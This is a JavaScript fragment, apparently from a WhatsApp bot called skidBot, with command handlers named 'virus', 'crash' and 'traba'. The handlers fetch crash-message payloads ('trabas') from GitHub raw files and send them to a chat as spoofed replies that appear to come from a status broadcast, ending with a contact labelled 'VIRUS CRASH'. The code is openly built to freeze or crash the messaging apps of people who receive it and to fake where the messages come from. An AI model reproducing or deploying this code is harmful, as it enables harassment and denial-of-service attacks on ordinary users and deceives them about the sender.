...
let virtex6 = await fetch('https://raw.githubusercontent.com/BrunoSobrino/Theskid-Bot-MD/master/src/trabas/traba1.txt').then(v => v.text());
let virtex7 = await fetch('https://raw.githubusercontent.com/BrunoSobrino/Theskid-Bot-MD/master/src/trabas/traba2.txt').then(v => v.text());
let virtex8 = await fetch('https://raw.githubusercontent.com/BrunoSobrino/Theskid-Bot-MD/master/src/trabas/traba3.txt').then(v => v.text());
let virtex9 = await fetch('https://raw.githubusercontent.com/BrunoSobrino/Theskid-Bot-MD/master/src/trabas/traba4.txt').then(v => v.text());
let virtex10 = await fetch('https://raw.githubusercontent.com/BrunoSobrino/Theskid-Bot-MD/master/src/trabas/traba5.txt').then(v => v.text());
    
switch (command) {
    
case 'virus': case 'binario': case 'traba': case 'crash': case 'virus1': case 'c1': case 'binario1': case 'traba1': case 'crash1': {
conn.fakeReply(from, virtex1, '0@s.whatsapp.net', '🔥 *By skidBot* 🔥', 'status@broadcast')
conn.fakeReply(from, virtex2, '0@s.whatsapp.net', '🔥 *By skidBot* 🔥', 'status@broadcast')
conn.fakeReply(from, virtex3, '0@s.whatsapp.net', '🔥 *By skidBot* 🔥', 'status@broadcast')
conn.fakeReply(from, virtex4, '0@s.whatsapp.net', '🔥 *By skidBot* 🔥', 'status@broadcast')
conn.fakeReply(from, virtex5, '0@s.whatsapp.net', '🔥 *By skidBot* 🔥', 'status@broadcast')} 
break
...
conn.fakeReply(from, virtex6, '0@s.whatsapp.net', '🔥 *By skidBot* 🔥', 'status@broadcast')
conn.fakeReply(from, virtex7, '0@s.whatsapp.net', '🔥 *By skidBot* 🔥', 'status@broadcast')
conn.fakeReply(from, virtex8, '0@s.whatsapp.net', '🔥 *By skidBot* 🔥', 'status@broadcast')}
break    
...
await conn.sendContact(from, '🔥 VIRUS CRASH BY skid 🔥', fkontaak)}
break   
